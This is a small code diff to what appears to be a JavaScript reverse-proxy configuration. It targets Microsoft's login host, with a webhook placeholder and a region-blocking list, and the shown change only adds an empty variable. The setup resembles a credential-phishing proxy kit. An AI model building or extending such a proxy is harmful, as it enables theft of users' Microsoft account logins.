@@ -3,6 +3,7 @@ const upstream = 'login.microsoftonline.com'
 const upstream_path = '/'
 const https = true
 const webhook = "<TEAMS_WEBHOOK>"
+let  connection_upgrade = ""
 
 // Blocking
 const blocked_region = []
